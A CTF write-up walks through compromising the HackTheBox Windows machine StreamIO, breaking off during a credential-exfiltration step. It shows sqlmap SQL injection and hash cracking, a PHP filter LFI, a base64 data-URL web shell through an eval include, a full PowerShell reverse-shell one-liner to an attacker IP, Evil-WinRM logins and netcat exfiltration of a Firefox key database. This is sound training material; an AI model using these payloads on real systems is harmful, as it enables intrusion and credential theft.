---
title: "Walk-through of StreamIO from HackTheBox"
header:
  teaser: /assets/images/2022-06-26-21-42-13.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Windows
  - SQLMap
  - Feroxbuster
  - wfuzz
  - sqlcmd
  - Evil-WinRM
  - firepwd
  - PowerView
  - Bloodhound
---

[StreamIO](https://www.hackthebox.com/home/machines/profile/474) is a medium level machine by [JDgodd](https://www.hackthebox.com/home/users/profile/481778) and [nikk37](https://www.hackthebox.com/home/users/profile/247264) on [HackTheBox](https://www.hackthebox.com/home). It's A Windows box that focuses on recon and enumeration, with an interesting mix of tools and techniques used to complete it.

<!--more-->

## Machine Information

![streamio](/assets/images/2022-06-26-21-42-13.png)

Our starting point on this box is taking advantage of a time based SQL injection to gather credentials. With access we now enumerate and fuzz to eventually find a method to get local file inclusion. We find a way to include a simple webshell on to a page and use this to get a reverse shell. We use this to find more credentials in another database which we can use with Evil-WinRM to connect as another user. Then we decrypt more credentials from a Firefox profile, which we can use to elevate our permissions to dump admin credentials from LAPS installed on the domain controller.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - StreamIO](https://www.hackthebox.com/home/machines/profile/474) |
| Machine Release Date | 4th June 2022 |
| Date I Completed It | 3rd July 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.158 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root㉿kali)-[~/htb/streamio]
└─# nmap -p$ports -sC -sV -oA streamio 10.10.11.158
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-26 21:45 BST
Nmap scan report for 10.10.11.158
Host is up (0.028s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-27 03:45:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
|_ssl-date: 2022-06-27T03:46:51+00:00; +6h59m57s from scanner time.
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
55635/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m56s
| smb2-time: 
|   date: 2022-06-27T03:46:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.14 seconds
```

This is a Windows box so we get a lot of open ports, we can see two names from the SSL cert so let's add them before we get going:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo "10.10.11.158 streamIO.htb watch.streamIO.htb" >> /etc/hosts
```

## Website

Let's look at the websites first:

![streamio-watch](/assets/images/2022-06-26-22-16-24.png)

This one doesn't appear to do anything at first glance. Let's look at the other:

![streamio-website](/assets/images/2022-06-26-22-18-32.png)

This site also doesn't do anything, there's a login page here:

![streamio-login](/assets/images/2022-06-26-22-22-57.png)

It doesn't work though, even if you click on the register button and enter details. It says the account is created but you can't login with it.

Let's intercept with Burp and have a look:

![streamio-saveitem](/assets/images/2022-06-26-22-29-48.png)

## SQLMap

Nothing of interest so i've right clicked and selected Save Item from the menu. Save the file, and switch to terminal to use it with SQLMap:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.6.4#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|___|
      |_|V...       |_|   https://sqlmap.org
[*] starting @ 22:33:24 /2022-06-26/

[22:33:24] [INFO] parsing HTTP request from 'streamio.req'
[22:33:27] [INFO] testing connection to the target URL
[22:33:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:33:28] [INFO] testing if the target URL content is stable
[22:33:29] [INFO] target URL content is stable
<SNIP>
sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:
---
Parameter: username (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: username=pencer';WAITFOR DELAY '0:0:5'--&password=pencer
---
[22:34:32] [INFO] testing Microsoft SQL Server
[22:34:32] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[22:34:42] [INFO] confirming Microsoft SQL Server DBMS delay responses (option '--time-sec')? [Y/n] 
[22:34:48] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 10 or 2019 or 2016
web application technology: Microsoft IIS 10.0, PHP 7.2.26
back-end DBMS: Microsoft SQL Server 2019
[22:34:48] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/streamio.htb'
[*] ending @ 22:34:48 /2022-06-26/
```

SQLMap has identified a time based vulnerability. If you're interested in learning more on SQL injection I covered a good TryHackMe room [here](https://pencer.io/ctf/ctf-thm-sqhell/) with all different types to play with. Back to this box, let's get a list of databases:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req --dbs
<SNIP>
[22:59:12] [INFO] retrieved: 
available databases [5]:
[*] model
[*] msdb
[*] STREAMIO
[*] streamio_backup
[*] tempdb
[*] ending @ 22:59:13 /2022-06-26/
```

The STREAMIO database sounds interesting as a starter, let's find the tables in it:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req --tables -D STREAMIO
<SNIP>
Database: STREAMIO
[2 tables]
+--------+
| movies |
| users  |
+--------+
[*] ending @ 23:01:52 /2022-06-26/
```

Let's look at the columns of the user table:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req --columns -D STREAMIO -T users
<SNIP>
Database: STREAMIO
Table: users
[4 columns]
+----------+-------+
| Column   | Type  |
+----------+-------+
| id       | int   |
| is_staff | bit   |
| password | nchar |
| username | nchar |
+----------+-------+
[*] ending @ 23:07:11 /2022-06-26/
```

Ok, so if you want to spend a long time watching SQLMap dump all users and passwords from the table then go for it:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req --dump -D STREAMIO -T users
```

If you want to just get the username and password we're interested in then use a where clause to speed it up:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# sqlmap -r streamio.req --dump -D STREAMIO -T users -C username,password --where "id=31" --force-pivoting
[*] starting @ 22:08:54 /2022-06-27/
[22:09:18] [INFO] adjusting time delay to 1 second due to good response times
b779ba15cedfd22a023c4d8bcf5f2332                  
[22:13:48] [INFO] retrieved: yoshihide                                         
Database: STREAMIO
Table: users
[1 entry]
+----------------------------------------------------+----------------------------------------------------+
| username                                           | password                                           |
+----------------------------------------------------+----------------------------------------------------+
| yoshihide                                          | b779ba15cedfd22a023c4d8bcf5f2332                   |
+----------------------------------------------------+----------------------------------------------------+
[*] ending @ 22:19:30 /2022-06-27/
```

Note, for me yoshihide was id number 31, it might be different for you just try and adjust id number if necessary.

## Crack Yoshihide Hash

With the password hash we can crack using JohnTheRipper:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo "b779ba15cedfd22a023c4d8bcf5f2332" > hash.txt

┌──(root㉿kali)-[~/htb/streamio]
└─# john hash.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
66boysandgirls.. (?)     
1g 0:00:00:01 DONE (2022-06-27 22:26) 0.8771g/s 10524Kp/s 10524Kc/s 10524KC/s 66che18bur17den..6698907
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

## Feroxbuster

Now we have credentials we can go back to the website and login:

![streamio-loggedin](/assets/images/2022-06-28-22-26-07.png)

The only difference when logged in is the top right corner link now says logout. With nothing more to look at let's try Feroxbuster:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# feroxbuster -k -u https://streamio.htb/
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://streamio.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        2l       10w      150c https://streamio.htb/admin => https://streamio.htb/admin/
200      GET      395l      915w    13497c https://streamio.htb/
<SNIP>
```

We get a lot of responses but the interesting one is the first 301, which tells us the scanned URL of admin get's redirected to /admin/. Let's have a look:

![streamio-admin](/assets/images/2022-06-28-22-38-19.png)

We have a page with four links, each is a parameter:

```text
https://streamio.htb/admin/?user=
https://streamio.htb/admin/?staff=
https://streamio.htb/admin/?movie=
https://streamio.htb/admin/?message=
```

The staff page lists the users we saw earlier when we used SQLMap to dump the table, and we see yoshihide at the bottom.

## Wfuzz

There's nothing much here, let's try fuzzing for more parameters but to do this we need to be logged in with a valid cookie. We can do it from the terminal:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -s -o /dev/null -k -X POST --cookie 'PHPSESSID=3k47ea2n095607g9vukkpvhu72' --data-binary 'username=yoshihide&password=66boysandgirls..' 'https://streamio.htb/login.php'
```

This silently logs us in with a valid cookie using the credentials we found earlier. Now we're authenticated we can use wfuzz to look at the parameter. Here's a test that it works with those known parameters and a few wrong one's to check the output:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# wfuzz -c -b PHPSESSID=3k47ea2n095607g9vukkpvhu72 -u 'https://streamio.htb/admin/?FUZZ=' -w fuzz.txt 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: https://streamio.htb/admin/?FUZZ=
Total requests: 10
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000001:   200        62 L     160 W      2073 Ch     "user"
000000002:   200        398 L    916 W      12484 Ch    "staff"
000000003:   200        10790    25878 W    320235 Ch   "movie"
000000004:   200        49 L     131 W      1678 Ch     "message"
000000005:   200        49 L     131 W      1678 Ch     "aaaaaa"
000000006:   200        49 L     131 W      1678 Ch     "bbbbbbb"
000000007:   200        49 L     131 W      1678 Ch     "cccccccc"
000000008:   200        49 L     131 W      1678 Ch     "ddddddddd"
```

You see a 200 response for all attempts but the characters returned is greater for those known valid parameters. New we can use a wordlist and filter response to just see any that are valid. I used [this](https://raw.githubusercontent.com/s0md3v/Arjun/master/arjun/db/small.txt) from the [Arjun](https://github.com/s0md3v/Arjun) repo:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# wfuzz -c -b PHPSESSID=3k47ea2n095607g9vukkpvhu72 --hh 1678 -u 'https://streamio.htb/admin/?FUZZ=' -w small.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: https://streamio.htb/admin/?FUZZ=
Total requests: 835
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000187:   200        49 L     137 W      1712 Ch     "debug"
000000788:   200        62 L     160 W      2073 Ch     "user"
Total time: 0
Processed Requests: 835
Filtered Requests: 833
Requests/sec.: 0
```

I used the -hh parameter for wfuzz to hide any response with 1678 characters which we know are invalid from our earlier test. Out of the 835 it tried we see debug is a new one. If we try it we see something interesting in the response:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -k --cookie "PHPSESSID=3k47ea2n095607g9vukkpvhu72" https://streamio.htb/admin/?debug=
```

Send that while we are logged in so the cookie is valid and we'll get this response:

```html
<SNIP>
        <br><hr><br>
        <div id="inc">
            this option is for developers only
        </div>
    </center>
</body>
<html>
```

## Local File Inclusion

After a little playing around we find we can use a php filter to achieve local file inclusion (LFI). [This](https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/) article briefly explains it. Also we've covered this before on the [Timing](https://pencer.io/ctf/ctf-htb-timing/) and [EarlyAccess](https://pencer.io/ctf/ctf-htb-earlyaccess/) boxes.

Let's grab the index.php file so we can see it's source code:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -k --cookie "PHPSESSID=3k47ea2n095607g9vukkpvhu72" "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php"
```

From the file we get back this part is interesting:

```html
<!DOCTYPE html>
<html>
<head>
        <meta charset="utf-8">
        <title>Admin panel</title>
        <link rel = "icon" href="/images/icon.png" type = "image/x-icon">
<SNIP>
                <div id="inc">
                        this option is for developers onlyPD9waHAKZGVmaW5lKCdpbmNsdWRlZCcsdHJ1ZSk7CnNlc3Npb25fc3RhcnQoKT
                        sKaWYoIWlzc2V0KCRfU0VTU0lPTlsnYWRtaW4nXSkpCnsKCWhlYWRlcignSFRUUC8xLjEgNDAzIEZvcmJpZGRlbicpOwoJZG
                        llKCI8aDEJlcXVpcmUgJ3N0YWZmX2luYy5waHAnOwoJCQkJZWxzZSBpZihpc3NldCgkX0dFVFsnbW92aWUnXSkpCgkJCQkJc
                        <SNIP>
                        ZSAnbW92aWVfaW5jLnBocCc7CgkJCQllbHNlIAoJCQk/PgoJCTwvZGl2PgoJPC9jZW50ZXI+CjwvYm9keT4KPC9odG1sPg==
                </div>
        </center>
</body>
</html>
```

There's a long base64 string at the end. Decode that and we have credentials for the database:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo "PD9waHAKZGVmaW5lKCdpbmNsdWRlZC <SNIP> KPC9odG1sPg==" > index.php.b64

┌──(root㉿kali)-[~/htb/streamio]
└─# cat index.php.b64 | base64 -d
<?php
define('included',true);
session_start();
if(!isset($_SESSION['admin']))
{
        header('HTTP/1.1 403 Forbidden');
        die("<h1>FORBIDDEN</h1>");
}
$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
$handle = sqlsrv_connect('(local)',$connection);
```

Not sure what we need those for yet, save for later.

## More Wfuzz

We can fuzz to look for more php files now we know we can access them via the debug parameter:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# wfuzz -c -b PHPSESSID=3k47ea2n095607g9vukkpvhu72 --hh 1712 -u 'https://streamio.htb/admin/?debug=FUZZ' -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: https://streamio.htb/admin/?debug=FUZZ
Total requests: 5163
=====================================================================
ID           Response  Lines      Word       Chars       Payload
=====================================================================
000000002:   200       46 L       136 W      1693 Ch     "index.php"
000002123:   200       1584516 L  4546873 W  57765942 Ch "Index.php"
000003375:   200       11218 L    26841 W    344592 Ch   "master.php"
Processed Requests: 5163
Filtered Requests: 5160
```

We have a new file called master.php, let's have a look at that:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -k --cookie "PHPSESSID=3k47ea2n095607g9vukkpvhu72" "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php"
```

We get the html back with another long base64 encoded string at the end. Decode it:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo "PGgxPk1vdmllIGwvaDE <SNIP> 8oIiAtL9DQo/Pg==" | base64 -d
```

Look at the end of the file:

```php
<br><hr><br>
<form method="POST">
<input name="include" hidden>
</form>
<?php
if(isset($_POST['include']))
{
if($_POST['include'] !== "index.php" ) 
eval(file_get_contents($_POST['include']));
else
echo(" ---- ERROR ---- ");
}
?>
```

We have some PHP at the end of the file that has an input field called include. It checks if the request has include in it, if it does and it's not a value of index.php then it includes that in the page. Why would you do that? To allow us to do remote code execution of course!

## Web Shell

[This](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs) article explains how to base64 encode data URLs, and [this](https://rastating.github.io/miniblog-remote-code-execution/) has an example of exploiting it. We can use this to inject a simple PHP web shell on to the page like we did on [Nineveh](https://pencer.io/ctf/ctf-htb-nineveh) and more recently [Timing](https://pencer.io/ctf/ctf-htb-timing).

First base64 encode this:

```php
system($_GET['cmd']);
```

On Zsh you have to make it a variable by adding dollar at the start and then escape the apostrophe's:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo -n $'system($_GET[\'cmd\']);' | base64
c3lzdGVtKCRfR0VUWydjbWQnXSk7
```

Now we can use that as a parameter to execute commands. We can use the same curl command as before, but now add the include data URL part with out base64 encoded system command. Then we can add our &cmd= parameter on the end, here I've put ipconfig as an example:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -s -k -X POST --cookie 'PHPSESSID=3k47ea2n095607g9vukkpvhu72' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=ipconfig' | sed -n '/<input name="include" hidden>/,$p'
<input name="include" hidden>
</form>
Windows IP Configuration
Ethernet adapter Ethernet0 2:
   Connection-specific DNS Suffix  . : htb
   IPv6 Address. . . . . . . . . . . : dead:beef::1ce
   IPv6 Address. . . . . . . . . . . : dead:beef::8c24:df77:f0ea:ebe5
   Link-local IPv6 Address . . . . . : fe80::8c24:df77:f0ea:ebe5%12
   IPv4 Address. . . . . . . . . . . : 10.10.11.158
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:6ddc%12
                                       10.10.10.2
                </div>
        </center>
</body>
</html>
```

## Reverse Shell

I've used sed to chop off the returned page all the way down to the bottom where our code output is returned. We could use this to do some recon, but really we just want a reverse shell so let's do that. We'll need a PowerShell one with this being a Windows box, use the Nishang one-liner [here](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3):

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.198",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

i've just changed the IP and port to my Kali's current one. Now base64 encode it on CyberChef:

![streamio-cyberchef](/assets/images/2022-06-30-17-08-29.png)

Start nc listening on port 1337 in another terminal then use the same curl command as before but with our Powershell payload on it:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# curl -s -k -X POST --cookie 'PHPSESSID=3k47ea2n095607g9vukkpvhu72' --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" 'https://streamio.htb/admin/?debug=master.php&cmd=powershell+-e+JABjAGwAaQBlAG4A <SNIP> vAHMAZQAoACkA'
```

Now switch to netcat to see we're connected. Quick recon:

```powershell
PS C:\inetpub\streamio.htb\admin> whoami
streamio\yoshihide

PS C:\inetpub\streamio.htb\admin> whoami /groups
GROUP INFORMATION
-----------------
Group Name                                  Type             SID          Attributes                                        
=========================================== ================ ============ ==================================================
Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity  Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448

PS C:\inetpub\streamio.htb\admin> net user
User accounts for \\DC
-------------------------------------------------------------------------------
Administrator            Guest                    JDgodd                   
krbtgt                   Martin                   nikk37                   
yoshihide                
The command completed successfully.
```

## SQLCmd

Ok, I admit this last part took me a while. I'd forgotten about the database credentials we found earlier. Anyway, the next step is look at the other database we found earlier. First we need to see if [sqlcmd](https://docs.microsoft.com/en-us/previous-versions/sql/2014/tools/sqlcmd-utility) is installed:

```powershell
PS C:\program files\microsoft sql server> gcm sqlcmd.exe | fl

Name            : SQLCMD.EXE
CommandType     : Application
Definition      : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
Extension       : .EXE
Path            : C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
FileVersionInfo : File:             C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\170\Tools\Binn\SQLCMD.EXE
                  InternalName:     SQLCMD
                  OriginalFilename: SQLCMD.exe
                  FileVersion:      2019.0150.2000.05 ((SQLServer).190924-2033)
                  FileDescription:  T-SQL execution command line utility
                  Product:          Microsoft SQL Server
                  ProductVersion:   15.0.2000.5
                  Language:         English (United States)
```

It is which means we can interact with the sql server locally. First list all the databases:

```powershell
PS C:\windows\temp> sqlcmd -S 127.0.0.1 -U db_admin -P "B1@hx31234567890" -Q "SELECT name FROM sys.databases;"
name
-------------------------------------------------------
master
tempdb
model
msdb
STREAMIO
streamio_backup
(6 rows affected)
```

Let's have a look at the backup database now we have access:

```powershell
PS C:\windows\temp> sqlcmd -S 127.0.0.1 -U db_admin -P "B1@hx31234567890" -Q "SELECT * FROM streamio_backup.information_schema.tables;"
TABLE_CATALOG            TABLE_SCHEMA           TABLE_NAME            TABLE_TYPE
------------------------ ---------------------- --------------------- ----------
streamio_backup          dbo                    movies                BASE TABLE
streamio_backup          dbo                    users                 BASE TABLE
(2 rows affected)
```

We have two tables in the database, let's look at users:

```powershell
PS C:\windows\temp> sqlcmd -S 127.0.0.1 -U db_admin -P "B1@hx31234567890" -Q "SELECT COLUMN_NAME FROM streamio_backup.information_schema.columns where TABLE_NAME = 'users';"
COLUMN_NAME
----------------------------------
id
username
password
(3 rows affected)
```

Usernames and passwords, just what we wanted:

```powershell
PS C:\windows\temp> sqlcmd -S 127.0.0.1 -U db_admin -P "B1@hx31234567890" -Q "USE streamio_backup; SELECT * FROM users;"
Changed database context to 'streamio_backup'.
id    username         password                                          
---- ----------------- -------------------------------
     1 nikk37          389d14cb8e4e9b94b137deb1caf0612a
     2 yoshihide       b779ba15cedfd22a023c4d8bcf5f2332
     3 James           c660060492d9edcaa8332d89c99c9239
     4 Theodore        925e5408ecb67aea449373d668b7359e
     5 Samantha        083ffae904143c4796e464dac33c1f7d
     6 Lauren          08344b85b329d7efd611b7a7743e8a09
     7 William         d62be0dc82071bccc1322d64ec5b6c51
     8 Sabrina         f87d3c0d6c8fd686aacc6627f1f493a5
(8 rows affected)
```

## Crack Nikk37 Hash

We can crack them like before with JohnTheRipper:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# echo "389d14cb8e4e9b94b137deb1caf0612a" > nikk37.txt

┌──(root㉿kali)-[~/htb/streamio]
└─# john nikk37.txt --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
get_dem_girls2@yahoo.com (?)     
1g 0:00:00:00 DONE (2022-06-30 21:45) 1.315g/s 10398Kp/s 10398Kc/s 10398KC/s getbenthelmet..get424
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

## Evil-WinRM

We get a password for the user nikk37, so let's use Evil-WinRM to get a shell as that user:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# apt install evil-winrm
Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following NEW packages will be installed:
  evil-winrm libruby3.0 ruby-builder ruby-domain-name ruby-erubi ruby-gssapi ruby-gyoku ruby-http-cookie
  ruby-httpclient ruby-little-plugger ruby-logging ruby-multi-json ruby-nori ruby-ntlm ruby-oj ruby-sqlite3
  ruby-unf ruby-unf-ext ruby-winrm ruby-winrm-fs ruby3.0
The following packages will be upgraded:
  metasploit-framework ruby
2 upgraded, 21 newly installed, 0 to remove and 379 not upgraded.
Need to get 157 MB of archives.
After this operation, 75.5 MB of additional disk space will be used.
Do you want to continue? [Y/n] y
Get:1 http://kali.download/kali kali-rolling/main amd64 libruby3.0 amd64 3.0.3-1 [5,385 kB]
Get:2 http://kali.download/kali kali-rolling/main amd64 metasploit-framework amd64 6.1.39-0kali1 [151 MB]
<SNIP>

┌──(root㉿kali)-[~/htb/streamio]
└─# evil-winrm -i 10.10.11.158 -u streamIO.htb\\nikk37 -p "get_dem_girls2@yahoo.com"
Evil-WinRM shell v3.3
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\nikk37\Documents>
```

We can grab the user flag:

```powershell
*Evil-WinRM* PS C:\Users\nikk37> type desktop\user.txt
2531e5d4fcb0d72eadec780b2176b4f4
```

Now we are looking to escalate to administrator. There's a clue if you look at the installed programs:

```powershell
*Evil-WinRM* PS C:\Users\nikk37> dir "c:\Program Files (x86)"
    Directory: C:\Program Files (x86)
Mode                LastWriteTime     Length Name
----                -------------     ------ ----
<SNIP>
d-----        2/22/2022   1:54 AM            Microsoft SQL Server
d-----        2/22/2022   1:53 AM            Microsoft.NET
d-----        5/26/2022   4:09 PM            Mozilla Firefox
d-----        5/26/2022   4:09 PM            Mozilla Maintenance Service
d-----        2/25/2022  11:33 PM            PHP
<SNIP>
```

## Firefox Stored Creds

Why would Firefox be installed on a Domain Controller?

Of course this is our path, and luckily I covered this a while ago on a TryHackMe room called [Gatekeeper](https://pencer.io/ctf/ctf-thm-gatekeeper) so the steps are simple. First we need to grab the key4.db and logins.json files. For some reason the download feature of Evil-WinRM wouldn't work so I used a static binary of netcat instead:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# wget https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
--2022-06-30 22:57:48--  https://eternallybored.org/misc/netcat/netcat-win32-1.12.zip
Resolving eternallybored.org (eternallybored.org)... 84.255.206.8, 2a01:260:4094:1:42:42:42:42
Connecting to eternallybored.org (eternallybored.org)|84.255.206.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 111892 (109K) [application/zip]
Saving to: ‘netcat-win32-1.12.zip’
netcat-win32-1.12.zip       100%[=============================>] 109.27K  --.-KB/s    in 0.1s    
2022-06-30 22:57:49 (1011 KB/s) - ‘netcat-win32-1.12.zip’ saved [111892/111892]

┌──(root㉿kali)-[~/htb/streamio]
└─# unzip netcat-win32-1.12.zip 
Archive:  netcat-win32-1.12.zip
  inflating: doexec.c                
  inflating: getopt.c                
  inflating: netcat.c                
  inflating: generic.h               
  inflating: getopt.h                
  inflating: hobbit.txt              
  inflating: license.txt             
  inflating: readme.txt              
  inflating: Makefile                
  inflating: nc.exe                  
  inflating: nc64.exe                

┌──(root㉿kali)-[~/htb/streamio]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

With nc downloaded and a Python web server running to host, we also need to set nc listening locally for the file when we send it across:

```sh
┌──(root㉿kali)-[~/htb/streamio]
└─# nc -nlvp 4444 > key4.db
listening on [any] 4444 ...
```

Here we've said whatever is recieved on port 4444 on Kali send it to a file called key4.db. Now over to the box to grab nc and use it to send the key4.db file:

```powershell
